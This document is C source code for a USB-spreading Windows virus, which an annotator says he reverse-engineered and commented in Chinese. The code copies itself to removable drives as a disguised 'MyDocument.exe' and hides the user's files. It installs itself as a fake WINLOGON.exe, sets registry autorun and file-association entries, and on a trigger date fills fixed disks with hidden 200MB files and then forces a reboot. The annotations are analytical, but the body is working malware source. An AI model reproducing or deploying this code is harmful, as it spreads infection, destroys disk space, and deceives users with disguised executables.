//本源码由本人逆向得到，下面的解释是个人理解		---------------lichao890427
//我们u盘上这个只是传播体，母体是winlogon.exe
#include <windows.h>
#include <stdio.h>
#include <io.h>
#include <process.h>
#include <errno.h>
void ShutDownYourPC(char* command);

int WriteLargeFileToDrive(char drive,int num)
{
	char FileName[FILENAME_MAX];
	memset(FileName,0,sizeof(FileName));
	wsprintf(FileName,"%c:\\%d",drive,num);
	HANDLE handle=CreateFile(FileName,GENERIC_ALL,0,NULL,CREATE_NEW,
		FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM ,NULL);
	if(handle == INVALID_HANDLE_VALUE) return 0;
	SetFilePointer(handle,0xC800000,NULL,FILE_BEGIN);//生成0xC800000=200MB大文件
	SetEndOfFile(handle);
	CloseHandle(handle);
	return 1;
}

void WriteFileToAllDisks()
{
	char RootPathName[9];
	char driverstring[]="cdefghijk";//用于枚举盘符
	int delta;
	
	int i=0;
	while(i<9)
	{
		wsprintf(RootPathName,"%c",driverstring[i]);
		strcat(RootPathName,":\\");
		if(GetDriveType(RootPathName) == DRIVE_FIXED)
		{//对于每个本地硬盘
			for(delta=1;delta<400;delta++)
			{
				WriteLargeFileToDrive(driverstring[i],delta);//生成400*200M文件=80G 
			}
		}
		i++;
	}
}

void destroysth()
{
	SYSTEMTIME SystemTime;
	memset(&SystemTime,0,sizeof(SYSTEMTIME));
	GetLocalTime(&SystemTime);
	DWORD data=SystemTime.wDay+100*(SystemTime.wMonth+100*SystemTime.wYear);
	if(data>20110400 && data<20110501)//在这两个日期之内，即病毒发作日期
	{
		WriteFileToAllDisks();
		Sleep(3600000);//1 hour
		ShutDownYourPC("shutdown -r -t 0 -f");//强制退出应用程序并重启
	}
}

void ModifyReg(LPCSTR lpData)
{//搞乱注册表，设置.caca文件打开方式,并设置自动运行
	HKEY hKey;
	
	RegCreateKey(HKEY_CLASSES_ROOT,".caca",&hKey);
	RegSetValue(hKey,NULL,REG_SZ,"cacafile",strlen("cacafile"));
	RegCloseKey(hKey);
	RegCreateKey(HKEY_CLASSES_ROOT,"cacafile\\shell\\open\\command",&hKey);
	RegSetValue(hKey,NULL,REG_SZ,"C:\\Program Files\\Internet Explorer\\WINLOGON.exe",
		strlen("C:\\Program Files\\Internet Explorer\\WINLOGON.exe"));
	RegCloseKey(hKey);
	RegCreateKey(HKEY_LOCAL_MACHINE,"software\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey);
	RegSetValue(hKey,NULL,REG_SZ,lpData,strlen(lpData));
	RegCloseKey(hKey);
}

int finddrivetospread()
{
	char RootPathName[8];
	char driverstring[]="defghijk";//用于枚举盘符  ascii:100-107
	
	int i=0;
	while(i<9)
	{
		wsprintf(RootPathName,"%c",driverstring[i]);
		strcat(RootPathName,":\\");
		if(GetDriveType(RootPathName) == DRIVE_REMOVABLE)
			return driverstring[i];
		if(i == 8) return 110;//未找到可移动磁盘则返回110
		Sleep(100);
		i++;
	}
	return 0;
}

void copyvirus(int drive)
{
	char PathName[FILENAME_MAX];
	WIN32_FIND_DATA FindFileData;
	char string1[FILENAME_MAX];
	char NewFileName[FILENAME_MAX];
	char FileName[FILENAME_MAX];
	char ExistingFileName[FILENAME_MAX];
	char string2[FILENAME_MAX];
	
	wsprintf(PathName,"%c:\\",drive);
	strcpy(string1,PathName);
	strcat(PathName,"\\MyDocuments");

	LPCSTR temp1;
	BOOL temp2;
	if(0 != _access(PathName,0))
	{
		wsprintf(NewFileName,"%s\\MyDocument.exe",string1);
		CreateDirectory(PathName,NULL);
		SetFileAttributes(PathName,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
		temp2=1;
		temp1=NewFileName;
	}
	else
	{
		SetFileAttributes(PathName,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
		wsprintf(NewFileName,"%s\\MyDocument.exe",string1);
		temp2=1;
		temp1=NewFileName;
	}
//感觉他写麻烦了。。。其实可以这样
//	wsprintf(NewFileName,"%s\\MyDocument.exe",string1);
// 	if(0 != _access(PathName,0))
// 	{	
// 		CreateDirectory(PathName,NULL);
// 	}
// 	SetFileAttributes(PathName,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	CopyFile("C:\\Program Files\\Internet Explorer\\WINLOGON.exe",NewFileName,TRUE);
	wsprintf(FileName,"%s\\*.*",string1);
	HANDLE first=FindFirstFile(FileName,&FindFileData);
	if(first == INVALID_HANDLE_VALUE) return ;
	do 
	{
		if(FindFileData.cFileName[0] != '.' && !(FindFileData.cFileName[1] == 'y' && 
			FindFileData.cFileName[9] == 't'))
		{
			wsprintf(ExistingFileName,"%s\\%s",string1,FindFileData.cFileName);
			wsprintf(string2,"%s\\%s",PathName,FindFileData.cFileName);
			MoveFileEx(ExistingFileName,string2,MOVEFILE_REPLACE_EXISTING );
		}
	} 
	while (FindNextFile(first,&FindFileData));
	FindClose(first);
}

void spreadvirus()
{
	char newfilename[FILENAME_MAX];

	while(TRUE)
	{
		if(finddrivetospread()/110) Sleep(100);
		else
		{//找到可移动磁盘
			int drive=finddrivetospread();
			copyvirus(drive);
			wsprintf(newfilename,"%c:\\MyDocument.exe",drive);
			CopyFile("C:\\Program Files\\Internet Explorer\\WINLOGON.exe",newfilename,TRUE);//我们u盘上这个只是传播体，母体是winlogon.exe
		}
	}
}

int main(int argc,const char** argv,const char** envp)
{

	char RootPathName[4];
	char Filename[FILENAME_MAX];
	char Data[FILENAME_MAX];
	char Buffer[FILENAME_MAX];
	char File[FILENAME_MAX];
	char ExistingFileName[FILENAME_MAX];
	int result;

	destroysth();
	GetCurrentDirectory(FILENAME_MAX,Buffer);
	wsprintf(RootPathName,"%c%c%c",Buffer[0],Buffer[1],Buffer[2]);
	UINT DriveType=GetDriveType(RootPathName);
	vprintf("%s\n",Buffer);
	result=vprintf("%d",(va_list)DriveType);
	if(DriveType == DRIVE_FIXED)//电脑硬盘
	{
		GetSystemDirectory(Filename,FILENAME_MAX);
		wsprintf(Data,"%c%c%cProgram Files",Filename[0],Filename[1],Filename[2]);
		strcat(Data,"\\system.caca");
		if(0 != _access("C:\\Program Files\\Internet Explorer\\WINLOGON.exe",0/*检查是否存在*/))
		{//如果不存在
			wsprintf(ExistingFileName,"%s\\WINLOGON.exe",Buffer);
			ModifyReg(Data);
			CopyFile(ExistingFileName,"C:\\Program Files\\Internet Explorer\\WINLOGON.exe",TRUE);
		}
		CreateFile(Data,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_NEW,
			FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM ,NULL);
		spreadvirus();
	}
	if(DriveType == DRIVE_REMOVABLE)//移动硬盘(mp3,u盘...)
	{
		if(0 != _access("C:\\Program Files\\Internet Explorer\\WINLOGON.exe",0/*检查是否存在*/))
		{//如果不存在
			GetSystemDirectory(Data,FILENAME_MAX);
			wsprintf(ExistingFileName,"%sMyDocument.exe",RootPathName);
			wsprintf(Filename,"%c%c%cProgram Files",Data[0],Data[1],Data[2]);
			strcat(Filename,"\\system.caca");
			CreateFile(Filename,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_NEW,
				FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM ,NULL);
			ModifyReg(Filename);
			CopyFile(ExistingFileName,"C:\\Program Files\\Internet Explorer\\WINLOGON.exe",TRUE);
			wsprintf(File,"%sMyDocument",RootPathName);
			ShellExecute(NULL,"explore",File,NULL,NULL,SW_SHOWNORMAL);//打开文件夹
			spreadvirus();
		}
		if(0 == (result=_access("C:\\Program Files\\Internet Explorer\\WINLOGON.exe",0/*检查是否存在*/)))
		{//如果复制成功
			wsprintf(File,"%sMyDocuments",Buffer);
			result=(int)ShellExecute(NULL,"explore",File,NULL,NULL,SW_SHOWNORMAL);//打开文件夹
		}
	}
	return result;
}

void ShutDownYourPC(char* command)
{
	char* pos=getenv("COMSPEC");//COMSPEC 指明DOS COMMAND．COM文件存在的目录
	char* Environment[4];

	Environment[0]=pos;
	if(command == NULL) 
	{
		if(pos != NULL) _access(pos,0);//这句话没什么效果。。。
		return;
	}

	Environment[1]="/c";
	Environment[2]=command;
	Environment[3]=NULL;
	if(pos == NULL || _spawnve(_P_WAIT,pos,Environment,NULL) == -1/*运行异常*/&& 
		(errno == ENOENT /*No such file or directory*/|| errno == EACCES /*Permission denied*/))
	{//如果执行关机命令失败
		pos="command.com";
		if((LOBYTE(_osver) & 0x80) == 0)//如果xp以上系统????
			pos="cmd.exe";
		_spawnvpe(_P_WAIT,pos,&pos,NULL);//利用命令行执行关机重启命令
	}
}